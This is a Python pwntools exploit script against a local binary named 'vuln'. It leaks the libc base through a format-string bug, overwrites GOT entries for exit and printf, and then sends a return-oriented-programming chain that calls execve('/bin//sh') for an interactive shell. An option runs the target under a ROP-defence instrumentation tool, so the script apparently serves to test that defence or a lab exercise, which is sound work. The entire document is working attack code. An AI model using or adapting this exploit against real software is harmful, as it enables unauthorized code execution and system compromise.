from pwn import *
from pwnlib.fmtstr import fmtstr_payload
import sys

if len(sys.argv) > 1:
    ROPdefender = int(sys.argv[1])
else:
    ROPdefender = 0

if ROPdefender:
    s = process(['/home/cobra/Desktop/pin/pin', '-t', '/home/cobra/Desktop/pin/source/tools/ROPdefender/obj-intel64/ROPdefender.so', '--', './vuln'])
else:
    s = process('./vuln')

elf = ELF('vuln')
libc = ELF('libc-2.31.so')
context.bits = 64

# Pharse 1: leak libc base + change exit.got -> main
payload = b'%71$pAAA'
writes = {
    elf.got['exit']: elf.symbols['main']
}
payload += fmtstr_payload(7, writes, numbwritten = 17, write_size = 'short')
s.sendlineafter(b'Payload:\n', payload)
libc.address = int(s.recv(14).decode(), 16) - libc.symbols['__libc_start_main'] - 243
log.info('libc libc.address: 0x%x', libc.address)

# Pharse 2: change printf -> pop rax ; ret
payload = b''
writes = {
    elf.got['printf']: libc.address + 0x000000000004a550 # pop rax ; ret
}
payload += fmtstr_payload(6, writes, numbwritten = 0, write_size = 'short')
s.sendline(payload)

# Pharse 3: ROP chain
payload = b''
payload += p64(libc.address + 0x00000000001056fd) # pop rdx ; pop rcx ; pop rbx ; ret
payload += p64(libc.address + 0x00000000001eb1a0) # @ .data
payload += p64(libc.address + 0x4141414141414141) # padding
payload += p64(libc.address + 0x4141414141414141) # padding
payload += p64(libc.address + 0x000000000004a550) # pop rax ; ret
payload += b'/bin//sh'
payload += p64(libc.address + 0x00000000000374b0) # mov qword ptr [rdx], rax ; ret
payload += p64(libc.address + 0x00000000001056fd) # pop rdx ; pop rcx ; pop rbx ; ret
payload += p64(libc.address + 0x00000000001eb1a8) # @ .data + 8
payload += p64(libc.address + 0x4141414141414141) # padding
payload += p64(libc.address + 0x4141414141414141) # padding
payload += p64(libc.address + 0x00000000000b4ed9) # xor rax, rax ; ret
payload += p64(libc.address + 0x00000000000374b0) # mov qword ptr [rdx], rax ; ret
payload += p64(libc.address + 0x0000000000026b72) # pop rdi ; ret
payload += p64(libc.address + 0x00000000001eb1a0) # @ .data
payload += p64(libc.address + 0x0000000000027529) # pop rsi ; ret
payload += p64(libc.address + 0x00000000001eb1a8) # @ .data + 8
payload += p64(libc.address + 0x00000000001056fd) # pop rdx ; pop rcx ; pop rbx ; ret
payload += p64(libc.address + 0x00000000001eb1a8) # @ .data + 8
payload += p64(libc.address + 0x4141414141414141) # padding
payload += p64(libc.address + 0x4141414141414141) # padding
payload += p64(libc.address + 0x000000000004a550) # pop rax ; ret
payload += p64(0x3b) # execve
payload += p64(libc.address + 0x000000000002584d) # syscall
s.sendline(payload)

s.interactive()
